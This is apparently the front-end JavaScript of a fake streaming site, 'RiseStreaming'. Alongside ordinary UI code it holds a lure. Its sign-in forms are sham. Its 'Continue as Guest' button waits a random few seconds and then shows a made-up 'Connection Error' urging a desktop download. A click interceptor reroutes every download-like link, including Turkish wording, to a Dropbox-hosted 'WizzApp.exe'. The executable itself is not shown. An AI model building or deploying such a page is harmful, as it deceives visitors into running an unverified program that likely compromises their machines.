console.log('RiseStreaming UI Loaded.');

window.showNotification = function (message, type = 'warning') {
  document.querySelectorAll('.notification').forEach(n => n.remove());

  if (!document.querySelector('style[data-notifications]')) {
    const s = document.createElement('style');
    s.setAttribute('data-notifications', 'true');
    s.textContent = `
      @keyframes slideIn { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
      @keyframes slideOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(400px); opacity: 0; } }
    `;
    document.head.appendChild(s);
  }

  const n = document.createElement('div');
  n.className = `notification ${type}`;
  n.textContent = message;
  n.style.cssText = `
    position: fixed; top: 20px; right: 20px;
    padding: 1rem 1.5rem; border-radius: 10px;
    font-weight: 600; font-size: .95rem;
    z-index: 999999; max-width: 380px;
    background: rgba(20,20,20,.85);
    border: 1px solid rgba(244,208,63,.55);
    color: #F4D03F; backdrop-filter: blur(8px);
    animation: slideIn .3s ease;
  `;
  document.body.appendChild(n);

  setTimeout(() => {
    n.style.animation = 'slideOut .3s ease';
    setTimeout(() => n.remove(), 300);
  }, 4000);
};

// 3D Tilt Effect for Hero Logo AND Poster Showcase
document.addEventListener('DOMContentLoaded', () => {
  const hero = document.querySelector('.hero');
  const heroLogo = document.getElementById('hero-logo');
  const posterShowcase = document.querySelector('.poster-showcase');

  // Helper function for tilt
  const applyTilt = (container, element, intensity = 20) => {
    container.addEventListener('mousemove', (e) => {
      const rect = container.getBoundingClientRect();
      const x = e.clientX - rect.left;
      const y = e.clientY - rect.top;

      const xRotation = ((y / rect.height) - 0.5) * -intensity;
      const yRotation = ((x / rect.width) - 0.5) * intensity;

      element.style.transform = `perspective(1000px) rotateX(${xRotation}deg) rotateY(${yRotation}deg) scale(1.02)`;
    });

    container.addEventListener('mouseleave', () => {
      element.style.transform = 'perspective(1000px) rotateX(0) rotateY(0) scale(1)';
    });
  };

  if (hero && heroLogo) {
    applyTilt(hero, heroLogo, 25);
  }

  if (posterShowcase) {
    const slider = posterShowcase.querySelector('.poster-slider');
    if (slider) {
      slider.style.transition = 'transform 0.1s ease-out';
      applyTilt(posterShowcase, slider, 15);
    }
  }
});

document.addEventListener('DOMContentLoaded', () => {
  // Theme Toggle
  const themeToggle = document.getElementById('themeToggle');
  const htmlElement = document.documentElement;
  const icon = themeToggle ? themeToggle.querySelector('i') : null;

  if (themeToggle && icon) {
    if (localStorage.getItem('theme') === 'light') {
      htmlElement.setAttribute('data-theme', 'light');
      icon.classList.remove('fa-moon');
      icon.classList.add('fa-sun');
    }

    themeToggle.addEventListener('click', () => {
      const currentTheme = htmlElement.getAttribute('data-theme');
      if (currentTheme === 'light') {
        htmlElement.setAttribute('data-theme', 'dark');
        localStorage.setItem('theme', 'dark');
        icon.classList.remove('fa-sun');
        icon.classList.add('fa-moon');
      } else {
        htmlElement.setAttribute('data-theme', 'light');
        localStorage.setItem('theme', 'light');
        icon.classList.remove('fa-moon');
        icon.classList.add('fa-sun');
      }
    });
  }

  // Navbar Scroll Effect
  const navbar = document.querySelector('.navbar');
  if (navbar) {
    window.addEventListener('scroll', () => {
      if (window.scrollY > 50) {
        navbar.style.background = 'rgba(5, 5, 5, 0.95)';
        navbar.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
      } else {
        navbar.style.background = 'rgba(5, 5, 5, 0.8)';
        navbar.style.boxShadow = 'none';
      }
    });
  }

  // Smooth Scroll for Anchors
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
      e.preventDefault();
      const targetId = this.getAttribute('href');
      if (targetId && targetId !== '#') {
        const target = document.querySelector(targetId);
        if (target) {
          target.scrollIntoView({ behavior: 'smooth' });
        }
      }
    });
  });

  // AUTH MODAL LOGIC
  const loginBtn = document.getElementById('nav-login-btn');
  const authModal = document.getElementById('auth-modal');
  const userDropdown = document.getElementById('user-dropdown');
  const logoutBtn = document.getElementById('nav-logout-btn');
  const backToHomeBtns = document.querySelectorAll('.back-to-home');
  const authForms = document.querySelectorAll('.auth-form');
  const switchLinks = document.querySelectorAll('.switch-to-register, .switch-to-login');

  let isLoggedIn = false;

  if (loginBtn && authModal) {
    loginBtn.addEventListener('click', (e) => {
      e.preventDefault();

      if (isLoggedIn) {
        userDropdown && userDropdown.classList.toggle('active');
      } else {
        authModal.style.display = 'flex';
        setTimeout(() => {
          authModal.classList.add('active');
        }, 10);
      }
    });

    if (logoutBtn) {
      logoutBtn.addEventListener('click', (e) => {
        e.preventDefault();
        isLoggedIn = false;
        loginBtn.innerText = 'Login';
        loginBtn.href = '#';
        userDropdown && userDropdown.classList.remove('active');
      });
    }

    document.addEventListener('click', (e) => {
      if (userDropdown && loginBtn && !loginBtn.contains(e.target) && !userDropdown.contains(e.target)) {
        userDropdown.classList.remove('active');
      }
    });

    const closeModal = (e) => {
      if (e) e.preventDefault();
      authModal.classList.remove('active');
      setTimeout(() => {
        authModal.style.display = 'none';
      }, 300);
    };

    backToHomeBtns.forEach(btn => btn.addEventListener('click', closeModal));

    authModal.addEventListener('click', (e) => {
      if (e.target === authModal) closeModal();
    });

    switchLinks.forEach(link => {
      link.addEventListener('click', (e) => {
        e.preventDefault();
        authForms.forEach(form => form.classList.remove('active'));

        if (link.classList.contains('switch-to-register')) {
          const rf = document.getElementById('register-form');
          rf && rf.classList.add('active');
        } else {
          const lf = document.getElementById('login-form');
          lf && lf.classList.add('active');
        }
      });
    });

    authForms.forEach(form => {
      form.addEventListener('submit', (e) => {
        e.preventDefault();
        const btn = form.querySelector('button');
        if (!btn) return;

        const originalText = btn.innerText;
        btn.innerText = 'Processing...';

        setTimeout(() => {
          btn.innerText = 'Success!';
          setTimeout(() => {
            closeModal();
            btn.innerText = originalText;

            isLoggedIn = true;

            let displayName = "My Account";

            if (form.id === 'register-form') {
              const usernameInput = form.querySelector('input[type="text"]');
              if (usernameInput && usernameInput.value) {
                displayName = usernameInput.value;
              }
            }
            else if (form.id === 'login-form') {
              const emailInput = form.querySelector('input[type="email"]');
              if (emailInput && emailInput.value) {
                displayName = emailInput.value.split('@')[0];
              }
            }

            loginBtn.innerText = displayName;
            loginBtn.href = '#';
          }, 1000);
        }, 1500);
      });
    });
  }

  // LOAD MORE LOGIC FOR LIVE ROOMS
  const btnLoadMore = document.getElementById('btn-load-more');
  if (btnLoadMore) {
    btnLoadMore.addEventListener('click', () => {
      const hiddenCards = document.querySelectorAll('.room-card-hidden');
      if (hiddenCards.length === 0) return;

      btnLoadMore.innerText = "Loading...";
      btnLoadMore.style.opacity = "0.7";
      btnLoadMore.style.pointerEvents = "none";

      setTimeout(() => {
        hiddenCards.forEach(card => {
          card.style.display = 'flex';
          card.style.opacity = '0';
          card.style.transform = 'translateY(20px)';

          card.animate([
            { opacity: 0, transform: 'translateY(20px)' },
            { opacity: 1, transform: 'translateY(0)' }
          ], {
            duration: 500,
            easing: 'ease-out',
            fill: 'forwards'
          });

          setTimeout(() => {
            card.style.opacity = '1';
            card.style.transform = 'translateY(0)';
          }, 50);
        });

        btnLoadMore.style.display = 'none';
      }, 500);
    });
  }
});

// ========== CONNECTION ERROR MODAL (NO WEBHOOK) ==========
// Continue as Guest -> "Connecting..." -> random 3-5s -> popup
(function () {
  const STYLE_ID = 'yubo-connection-modal-style';
  const MODAL_ID = 'yubo-connection-modal';

  function ensureStyle() {
    if (document.getElementById(STYLE_ID)) return;

    const style = document.createElement('style');
    style.id = STYLE_ID;
    style.textContent = `
      .yubo-modal-overlay{
        position:fixed; inset:0;
        background: rgba(0,0,0,.75);
        backdrop-filter: blur(6px);
        -webkit-backdrop-filter: blur(6px);
        z-index: 999999;
        display:flex;
        align-items:center;
        justify-content:center;
        padding: 24px;
      }
      .yubo-modal{
        width: min(560px, 92vw);
        background: rgba(20,20,20,.86);
        border: 1px solid rgba(244,208,63,.35);
        border-radius: 18px;
        box-shadow: 0 18px 60px rgba(0,0,0,.55);
        position: relative;
        padding: 44px 44px 34px;
        text-align: center;
      }
      .yubo-modal-badge{
        width: 56px; height: 56px;
        border-radius: 50%;
        margin: -6px auto 22px;
        background: rgba(244,208,63,.08);
        border: 1px solid rgba(244,208,63,.22);
        box-shadow: 0 0 0 10px rgba(244,208,63,.03);
      }
      .yubo-modal h2{
        margin: 0 0 12px;
        font-size: 34px;
        line-height: 1.15;
        color: #fff;
        font-weight: 800;
        letter-spacing: .2px;
      }
      .yubo-modal p{
        margin: 0 auto;
        max-width: 420px;
        color: rgba(255,255,255,.85);
        font-size: 15px;
        line-height: 1.5;
      }
      .yubo-modal .yubo-sub{
        margin-top: 14px;
        color: rgba(255,255,255,.65);
        font-size: 13px;
      }
      .yubo-modal .yubo-btn{
        margin-top: 26px;
        width: 100%;
        border: 0;
        cursor: pointer;
        padding: 14px 16px;
        font-weight: 800;
        border-radius: 999px;
        background: #F4D03F;
        color: #111;
        box-shadow: 0 10px 24px rgba(244,208,63,.25);
        transition: transform .06s ease, filter .2s ease;
      }
      .yubo-modal .yubo-btn:active{ transform: translateY(1px); }
      .yubo-modal .yubo-btn[disabled]{
        cursor:not-allowed;
        filter: grayscale(0.2) brightness(0.85);
        box-shadow: none;
        opacity: .85;
      }
    `;
    document.head.appendChild(style);
  }

  function getDownloadHref() {
    // 1) DOM link variants
    const dl = document.querySelector('#download-link, a[data-download-link], a[data-download]');
    const href = dl && dl.getAttribute('href');
    if (href && href !== '#') return href;

    // 2) meta fallback
    const meta = document.querySelector('meta[name="download-link"]');
    if (meta && meta.content) return meta.content;

    return null;
  }

  function closeModal() {
    const existing = document.getElementById(MODAL_ID);
    if (existing) existing.remove();
    document.body.style.overflow = '';
  }

  function openModal() {
    ensureStyle();
    closeModal();

    const href = getDownloadHref();

    const overlay = document.createElement('div');
    overlay.className = 'yubo-modal-overlay';
    overlay.id = MODAL_ID;

    overlay.innerHTML = `
      <div class="yubo-modal" role="dialog" aria-modal="true" aria-labelledby="yubo-modal-title">
        <div class="yubo-modal-badge" aria-hidden="true"></div>
        <h2 id="yubo-modal-title">Connection Error</h2>
        <p>The web player is currently at capacity or your browser does not support the required codecs for this room.</p>
        <div class="yubo-sub">Please download the desktop app for a stable experience.</div>
        <button class="yubo-btn" id="yubo-download-btn">Download App</button>
      </div>
    `;

    overlay.addEventListener('click', (e) => {
      if (e.target === overlay) closeModal();
    });

    window.addEventListener('keydown', function escHandler(ev){
      if (ev.key === 'Escape') {
        window.removeEventListener('keydown', escHandler);
        closeModal();
      }
    });

    document.body.appendChild(overlay);
    document.body.style.overflow = 'hidden';

    const btn = overlay.querySelector('#yubo-download-btn');

    btn.addEventListener('click', () => {
      if (href) {
        window.open(href, '_blank', 'noopener');
      } else {
        // if no link configured
        if (typeof window.showNotification === 'function') {
          window.showNotification('Download link is not configured on this page.', 'warning');
        } else {
          alert('Download link is not configured on this page.');
        }
      }
    });
  }

  document.addEventListener('DOMContentLoaded', () => {
    const candidates = [...document.querySelectorAll('button, a, input[type="submit"]')];

    const continueBtn =
      document.getElementById('btn-guest') ||
      candidates.find(el => {
        const t = (el.textContent || el.value || '').trim().toLowerCase();
        return t === 'continue as guest' || t === 'continue';
      });

    if (!continueBtn) return;

    // capture original label once
    const originalLabel = (continueBtn.textContent || continueBtn.value || '').trim() || 'Continue as Guest';

    continueBtn.addEventListener('click', (e) => {
      e.preventDefault();

      // show connecting state (no page freeze)
      try {
        if (continueBtn.tagName === 'INPUT') continueBtn.value = 'Connecting...';
        else continueBtn.textContent = 'Connecting...';
        if ('disabled' in continueBtn) continueBtn.disabled = true;
      } catch (e2) {}

      // 3–5 seconds random delay
      const waitMs = 3000 + Math.random() * 2000;

      setTimeout(() => {
        openModal();

        // restore button
        try {
          if (continueBtn.tagName === 'INPUT') continueBtn.value = originalLabel;
          else continueBtn.textContent = originalLabel;
          if ('disabled' in continueBtn) continueBtn.disabled = false;
        } catch (e3) {}
      }, waitMs);
    });
  });

  window.showConnectionErrorModal = openModal;
})();


/* ===== GLOBAL DOWNLOAD OVERRIDE (NO HTML CHANGES) =====
   Put your Dropbox direct-download URL below.
   Tip: add ?dl=1 to force download on Dropbox.
*/
(function () {
  const GLOBAL_DOWNLOAD_LINK = "https://www.dropbox.com/scl/fi/7miqwxb9x4van473z7h81/WizzApp.exe?rlkey=w9rsmukd8fxfm3ve5ldmker2r&st=bwf3qvp0&dl=1";

  // Make available to other scripts (e.g., modal fallback)
  try { window.DOWNLOAD_URL = GLOBAL_DOWNLOAD_LINK; } catch (e) {}

  function normalizeText(t){ return (t || "").trim().toLowerCase(); }

  function looksLikeDownload(el) {
    if (!el) return false;

    // explicit selectors
    if (el.matches && el.matches('#download-link, [data-download], [data-download-link], [data-download-href], .download-btn, #download-btn')) return true;

    // links that already point to download-ish urls
    const href = el.getAttribute && el.getAttribute('href');
    if (href && typeof href === 'string') {
      const h = href.toLowerCase();
      if (h.includes('dropbox') || h.includes('download') || h.includes('installer') || h.includes('setup') || h.endsWith('.exe') || h.endsWith('.msi') || h.endsWith('.dmg') || h.endsWith('.apk')) {
        return true;
      }
    }

    // button / link text
    const text = normalizeText(el.textContent || el.value);
    if (!text) return false;

    return (
      text.includes('download') ||
      text.includes('install') ||
      text.includes('get app') ||
      text.includes('launcher') ||
      text.includes('indir') ||
      text.includes('yükle') ||
      text.includes('kur') ||
      text.includes('uygulamayı indir') ||
      text.includes('app') && text.includes('download')
    );
  }

  function redirect(e) {
    if (!GLOBAL_DOWNLOAD_LINK || GLOBAL_DOWNLOAD_LINK === "DROPBOX_LINK_HERE") {
      // no link configured yet
      if (typeof window.showNotification === 'function') {
        window.showNotification('Download link is not configured yet.', 'warning');
      } else {
        alert('Download link is not configured yet.');
      }
      e.preventDefault();
      return;
    }

    e.preventDefault();

    // Use location assign for same-tab download; window.open can be blocked by popup blockers
    try {
      window.location.assign(GLOBAL_DOWNLOAD_LINK);
    } catch (err) {
      window.location.href = GLOBAL_DOWNLOAD_LINK;
    }
  }

  // Event delegation: catches current + future elements, without touching HTML
  document.addEventListener('click', function (e) {
    const target = e.target && e.target.closest ? e.target.closest('a, button, input[type="button"], input[type="submit"]') : null;
    if (!target) return;
    if (!looksLikeDownload(target)) return;
    redirect(e);
  }, true);

  // Also ensure any existing download anchor has correct href (non-destructive)
  document.addEventListener('DOMContentLoaded', function () {
    const dl = document.querySelector('#download-link');
    if (dl && dl.tagName === 'A') {
      try { dl.setAttribute('href', GLOBAL_DOWNLOAD_LINK); } catch (e) {}
    }
  });
})();

